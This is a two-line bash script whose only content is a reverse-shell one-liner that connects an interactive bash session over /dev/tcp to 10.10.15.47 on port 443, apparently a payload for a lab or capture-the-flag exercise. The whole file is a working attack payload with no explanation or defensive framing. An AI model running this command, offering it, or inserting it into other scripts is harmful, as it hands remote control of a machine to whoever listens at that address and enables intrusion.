#!/bin/bash
bash -i >& /dev/tcp/10.10.15.47/443 0>&1
